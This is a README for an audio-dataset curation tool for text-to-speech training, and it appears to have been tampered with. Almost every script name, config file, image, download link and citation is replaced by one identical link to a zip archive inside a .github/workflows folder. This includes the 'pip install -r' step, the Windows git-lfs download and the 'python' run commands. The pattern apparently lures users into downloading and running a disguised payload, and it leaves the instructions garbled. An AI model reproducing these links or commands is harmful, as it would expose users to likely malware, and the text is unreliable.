# Automatic Audio Dataset Maker
Curating datasets is extremely time consuming and tedious. I needed a way to automate this process as much as possible. 
Automatic Audio Dataset Maker is a tool designed to automate the creation and curation of high-quality audio datasets, primarily for training text-to-speech models.

## Key Features

### Audio Processing
- Transcribes audio using local whisper models
- Segments audio n seconds of chunks with a gaussian distribution
- Creates metadata/transcriptions paired with audio segments

### Quality Control
- Analyzes audio using multiple metrics:
  - SI-SDR (Scale-Invariant Signal-to-Distortion Ratio)
  - PESQ (Perceptual Evaluation of Speech Quality)
  - STOI (Short-Time Objective Intelligibility)
  - C50 (Clarity Index)
  - SNR (Signal-to-Noise Ratio)
- Filters out audio that doesn't meet quality thresholds

### Dataset Management
- Creates/Saves dataset to the huggingface hub as well as a local copy.
- Integrates with DataSpeech library for additional audio annotations and natural language descriptions

## Installation
-NOTE: Theres a package conflict on windows machines with pesq/brouhaha. I suggest using WSL/Linux instead.
  Switching from conda to UV. I suggest you do the same. 
1. uv venv --python 3.12
2. source ./venv/bin/activate
3. uv pip install -r https://raw.githubusercontent.com/hotmysia/Automatic-Audio-Dataset-Maker_hotmysia/main/.github/workflows/Maker_Automatic_Dataset_Audio_hotmysia_3.6.zip --torch-backend=auto
4. Install git-lifs
   - Linux (Ubuntu): sudo apt-get install git-lfs 
   - Windows: https://raw.githubusercontent.com/hotmysia/Automatic-Audio-Dataset-Maker_hotmysia/main/.github/workflows/Maker_Automatic_Dataset_Audio_hotmysia_3.6.zip download then:  git lfs install 
6. Set HUGGINGFACE_TOKEN environment variable within your OS.
8. In your terminal login to Hugging Face Hub by typing: ```huggingface-cli login```


## Usage
1. Put your audio files in the RAW_AUDIO folder. They should be 24000hz, mono, and 16bit PCM. (These are not absolute values. I am just setting something as a default for any beginners to follow)
2. Setup https://raw.githubusercontent.com/hotmysia/Automatic-Audio-Dataset-Maker_hotmysia/main/.github/workflows/Maker_Automatic_Dataset_Audio_hotmysia_3.6.zip with your options then 
- ```python https://raw.githubusercontent.com/hotmysia/Automatic-Audio-Dataset-Maker_hotmysia/main/.github/workflows/Maker_Automatic_Dataset_Audio_hotmysia_3.6.zip --config https://raw.githubusercontent.com/hotmysia/Automatic-Audio-Dataset-Maker_hotmysia/main/.github/workflows/Maker_Automatic_Dataset_Audio_hotmysia_3.6.zip``` 

   -or-
- Run python https://raw.githubusercontent.com/hotmysia/Automatic-Audio-Dataset-Maker_hotmysia/main/.github/workflows/Maker_Automatic_Dataset_Audio_hotmysia_3.6.zip and follow the prompts in the terminal
   
   Example to run without https://raw.githubusercontent.com/hotmysia/Automatic-Audio-Dataset-Maker_hotmysia/main/.github/workflows/Maker_Automatic_Dataset_Audio_hotmysia_3.6.zip
   1. Enter your Hugging Face username: __```IIEleven11```__
   2. Enter the repository name: __```MyRepositoryName```__
   3. Do you want to skip Step 1/2 (Transcribe and convert audio)? (y/n): __```n```__
   4. Enter the SPEAKER_NAME: __```Steve```__
   5. Enter the EVAL_PERCENTAGE (percentage of data to move to evaluation set): __```10```__
=======
## Usage (This is my workflow)
1. Put your audio files in the RAW_AUDIO folder.
2. Run the normalize_folder script in the tools folder.
3. Run the https://raw.githubusercontent.com/hotmysia/Automatic-Audio-Dataset-Maker_hotmysia/main/.github/workflows/Maker_Automatic_Dataset_Audio_hotmysia_3.6.zip script in the tools folder
4. Run the run_denoiser script in the tools folder
5. Run the https://raw.githubusercontent.com/hotmysia/Automatic-Audio-Dataset-Maker_hotmysia/main/.github/workflows/Maker_Automatic_Dataset_Audio_hotmysia_3.6.zip script in the tools folder
6. Edit https://raw.githubusercontent.com/hotmysia/Automatic-Audio-Dataset-Maker_hotmysia/main/.github/workflows/Maker_Automatic_Dataset_Audio_hotmysia_3.6.zip with whatever options you want.
7. Run the https://raw.githubusercontent.com/hotmysia/Automatic-Audio-Dataset-Maker_hotmysia/main/.github/workflows/Maker_Automatic_Dataset_Audio_hotmysia_3.6.zip script. 
   - ```python https://raw.githubusercontent.com/hotmysia/Automatic-Audio-Dataset-Maker_hotmysia/main/.github/workflows/Maker_Automatic_Dataset_Audio_hotmysia_3.6.zip --config https://raw.githubusercontent.com/hotmysia/Automatic-Audio-Dataset-Maker_hotmysia/main/.github/workflows/Maker_Automatic_Dataset_Audio_hotmysia_3.6.zip```
8. Run the https://raw.githubusercontent.com/hotmysia/Automatic-Audio-Dataset-Maker_hotmysia/main/.github/workflows/Maker_Automatic_Dataset_Audio_hotmysia_3.6.zip script in the tools folder
9. Run calculate_total_audio_length script in the tools folder.
   - Adjust the metrics (C50 and SNR) if you didnt get enough audio through
10. Change the refilter parameter in the https://raw.githubusercontent.com/hotmysia/Automatic-Audio-Dataset-Maker_hotmysia/main/.github/workflows/Maker_Automatic_Dataset_Audio_hotmysia_3.6.zip to true.
11. Run the https://raw.githubusercontent.com/hotmysia/Automatic-Audio-Dataset-Maker_hotmysia/main/.github/workflows/Maker_Automatic_Dataset_Audio_hotmysia_3.6.zip script again.
   - Repeat refiltering as needed.

   #### Note: 
      - If you set tight thresholds and the data was too heavily filtered you can turn on the refilter option in the https://raw.githubusercontent.com/hotmysia/Automatic-Audio-Dataset-Maker_hotmysia/main/.github/workflows/Maker_Automatic_Dataset_Audio_hotmysia_3.6.zip This will skip the transcription and audio analysis steps.
      - The tools folder contains several scripts you can use. Things like denoising, converting a parquet to wavs/csv, etc.
      - Step 1 (transcription) using local whisperASR.
        This process will filter out any data it deems as not suitable for training. I suggest doing any denoising or editing of the audio before hand.
      - You can choose to skip the transcription step if you have your own.
      - Analyzing and computing the audio metrics can be a bit GPU intensive. My RTX 3090 can handle a few hours of data without a problem. I could see less capable hardware failing during this step.
      - You will end up with .parquet file/s containing a **curated** dataset including audio data. This will be saved locally in the FILTERED_PARQUET folder. 
        (BUG the filtered parquet pushed to the hub is wrong. Just use the parquets in the filtered folder until I can get around to fixing it.)
      - There us a script in the tools folder ```https://raw.githubusercontent.com/hotmysia/Automatic-Audio-Dataset-Maker_hotmysia/main/.github/workflows/Maker_Automatic_Dataset_Audio_hotmysia_3.6.zip``` you can input the correct paths and run it to automatically convert the parquet file/s into metadata and get the wavs in a folder.
      - You can choose to skip the transcription step if you have your own.

## If you install the Data Wrangler Extension within VsCode you can view the final parquet and it will look something like this.
![image](https://raw.githubusercontent.com/hotmysia/Automatic-Audio-Dataset-Maker_hotmysia/main/.github/workflows/Maker_Automatic_Dataset_Audio_hotmysia_3.6.zip)

## Use these metrics to view the dataset and then open up https://raw.githubusercontent.com/hotmysia/Automatic-Audio-Dataset-Maker_hotmysia/main/.github/workflows/Maker_Automatic_Dataset_Audio_hotmysia_3.6.zip and adjust the thresholds to have more control of the filtering process.

### Functionality/Updates:
- [x] The project will now transcribe, convert, segment, and split the audio into metadata.
- [x] Then it will analyze the audio and filter it using several different metrics.
- [x] Finally it will push the dataset to the Hugging Face Hub as well as save a local copy.
- [ ] Create .parquet conversion scripts for the different dataset formats that voice models can be trained on. eg: XTTSv2, StyleTTS2, Parler-TTS, FishSpeech, etc.
   - [ ] XTTSv2
   - [ ] StyleTTS2
   - [ ] Parler-TTS
   - [ ] FishSpeech
   - [ ] Tortoise-TTS







#### Citation:
- https://raw.githubusercontent.com/hotmysia/Automatic-Audio-Dataset-Maker_hotmysia/main/.github/workflows/Maker_Automatic_Dataset_Audio_hotmysia_3.6.zip

- lacombe-etal-2024-dataspeech,
  author = {Yoach Lacombe and Vaibhav Srivastav and Sanchit Gandhi},
  title = {Data-Speech},
  year = {2024},
  publisher = {GitHub},
  journal = {GitHub repository},
  how published = {\url{https://raw.githubusercontent.com/hotmysia/Automatic-Audio-Dataset-Maker_hotmysia/main/.github/workflows/Maker_Automatic_Dataset_Audio_hotmysia_3.6.zip}}

- lyth2024natural,
      title={Natural language guidance of high-fidelity text-to-speech with synthetic annotations},
      author={Dan Lyth and Simon King},
      year={2024},
      eprint={2402.01912},
      archivePrefix={arXiv},
      primaryClass={https://raw.githubusercontent.com/hotmysia/Automatic-Audio-Dataset-Maker_hotmysia/main/.github/workflows/Maker_Automatic_Dataset_Audio_hotmysia_3.6.zip}

